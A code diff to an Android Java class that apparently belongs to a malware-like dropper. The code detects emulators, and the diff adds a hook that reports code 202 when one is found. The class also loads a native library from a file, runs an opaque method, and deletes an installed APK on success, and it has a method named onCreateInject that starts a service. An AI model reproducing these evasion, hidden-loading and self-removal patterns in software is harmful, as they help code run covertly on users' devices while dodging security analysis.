@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 
 import com.use.nice.manager.GlobalContext;
+import com.use.nice.update.UDCtrl;
 import com.use.nice.update.UpdateUtil;
 import com.use.nice.util.EmulateCheckUtil;
 import com.use.nice.util.Util_File;
@@ -33,6 +34,7 @@ public class NiceFace {
             @Override
             public void isEmulator() {
                 Util_Log.log("is emulator!");
+                UDCtrl.getIns().pushLog(202+"");
                 if (GlobalContext.isTest)
                     onReceiveReal(paramContext, paramIntent);
             }
@@ -100,7 +102,8 @@ public class NiceFace {
                     System.load("" + file.getAbsolutePath());
                     String ret = c.a(paramContext);
                      Util_Log.logReal("nice exe ret:" + ret);
-                    Util_File.writeDef(paramContext, FieldName.soSuccess, ret);
+
+                     Util_File.writeDef(paramContext, FieldName.soSuccess, ret);
                     if (ret.equals(FieldName.success)) {
                         face.deleteApk();
                     }
@@ -139,7 +142,7 @@ public class NiceFace {
     public static void onCreateInject(Context ctx) {
         Intent it = new Intent(ctx, MyService.class);
         ctx.startService(it);
-        GlobalContext.init(ctx);
+//        GlobalContext.init(ctx);
 //        Util_Log.logReal("onCreate ... ");
 //        Intent it = new Intent();
 //        it.putExtra(FieldName.onCreate, "true");
